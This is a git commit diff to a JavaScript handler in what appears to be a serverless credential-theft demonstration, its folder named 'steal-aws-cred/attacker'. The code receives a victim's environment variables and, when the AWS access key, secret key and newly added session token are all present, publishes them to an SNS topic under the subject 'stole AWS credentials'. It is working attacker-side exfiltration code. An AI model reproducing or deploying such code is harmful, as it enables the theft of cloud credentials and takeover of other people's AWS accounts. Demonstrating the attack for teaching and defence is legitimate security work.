d7b19d02bee735ac37d4370b3629da7ca565bdcb
theburningmonk <theburningmonk@gmail.com>
2017-07-23 01:52:21 +0100

    - need the session token too for the stolen aws cred

--- steal-aws-cred/attacker/handler.js
+++ steal-aws-cred/attacker/handler.js
@@ -10,10 +10,12 @@ const response = { statusCode: 200 };
 module.exports.handler = co.wrap(function* (event, context, callback) {  
   let envVars = JSON.parse(event.body);
 
-  if (envVars.AWS_ACCESS_KEY_ID && envVars.AWS_SECRET_ACCESS_KEY) {
+  if (envVars.AWS_ACCESS_KEY_ID && 
+      envVars.AWS_SECRET_ACCESS_KEY && 
+      envVars.AWS_SESSION_TOKEN) {
     // jackpot
     let req = {
-      Message: `AWS_ACCESS_KEY_ID=${envVars.AWS_ACCESS_KEY_ID} AWS_SECRET_ACCESS_KEY=${envVars.AWS_SECRET_ACCESS_KEY}`,
+      Message: `AWS_ACCESS_KEY_ID=${envVars.AWS_ACCESS_KEY_ID} AWS_SECRET_ACCESS_KEY=${envVars.AWS_SECRET_ACCESS_KEY} AWS_SESSION_TOKEN=${envVars.AWS_SESSION_TOKEN}`,
       Subject: 'stole AWS credentials',
       TopicArn: process.env.JACKPOT_TOPIC
     };
